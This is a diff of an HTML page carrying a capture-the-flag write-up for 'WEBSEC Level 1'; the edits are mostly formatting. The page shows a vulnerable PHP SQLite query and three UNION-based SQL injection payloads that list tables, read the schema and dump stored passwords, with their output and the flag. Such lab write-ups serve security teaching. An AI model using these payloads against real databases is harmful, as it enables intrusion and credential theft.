@@ -76,10 +76,10 @@
         
   <section class="container centered">
   <div class="error">
-   <h1 id="websec-level-1">WEBSEC Level 1</h1>
-<h3 id="challenge-description">Challenge description</h2>
+   <h1 id="websec-level-1">WEBSEC Level 1</h1><br><br>
+<h3 id="challenge-description">Challenge description</h3>
 <p>Nothing fancy</p>
-<h2 id="initial-analysis">Initial analysis</h2>
+<h3 id="initial-analysis">Initial analysis</h3>
 <p><code>class LevelOne {
     public function doQuery($injection) {
         $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
@@ -95,12 +95,12 @@
         return false;
     }
 }</code>
-
-<h3 id="walk-through">Walk through</h2>
+<br>
+<h3 id="walk-through">tl;dr</h3>
 <p>STEP 1: <code>0 union SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type = 'table'--</code> OUTPUT: Other User Details: id -&gt; 1 username -&gt; users (Table name)</p>
 <p>STEP 2: <code>0 union select 1,sql from sqlite_master--</code> OUTPUT: Other User Details: id -&gt; 1 username -&gt; CREATE TABLE users(id int(7), username varchar(255), password varchar(255)) (Column name)</p>
-<p>STEP 3: <code>0 UNION SELECT 1, GROUP_CONCAT(password) FROM users--</code> OUTPUT: Other User Details: id -&gt; 1 username -&gt; UnrelatedPassword, ExampleUserPassword, WEBSEC{Simple_SQLite_Injection}</p>
-<h2 id="flag">Flag</h2>
+<p>STEP 3: <code>0 UNION SELECT 1, GROUP_CONCAT(password) FROM users--</code> OUTPUT: Other User Details: id -&gt; 1 username -&gt; UnrelatedPassword, ExampleUserPassword, WEBSEC{Simple_SQLite_Injection}</p><br>
+<h3 id="flag">Flag</h3>
 <p><strong>FLAG</strong>: <code>WEBSEC{Simple_SQLite_Injection}</code></p>
 <p>For further queries, please DM me on Twitter: <a href="https://twitter.com/m0n574">https://twitter.com/m0n574</a>.</p>
 
